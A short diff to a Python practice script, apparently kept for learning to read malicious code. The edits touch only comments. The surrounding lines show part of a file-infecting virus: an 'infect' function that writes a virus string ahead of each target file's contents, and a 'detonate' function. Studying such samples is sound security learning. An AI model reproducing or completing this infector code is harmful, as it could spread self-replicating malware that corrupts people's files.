@@ -2,7 +2,7 @@
 # Author:                       Dominique Bruso
 # Date of latest revision:      12/15/2023
 # Purpose:                      To practice reading scripts
-# Execution:                    Don't! (Indicates that running the script is not recommended)
+# Execution:                    Don't! 
 # Source: 
 
 #!/usr/bin/python3
@@ -52,7 +52,7 @@ def infect(files_targeted):
         f.close()
         f = open(fname, "w")
         f.write(virusstring + temp)  # Writes the virus string followed by the original content
-        f.close()
+        f.close() # closes the file
 
 def detonate():
     # Defines a function 'detonate'
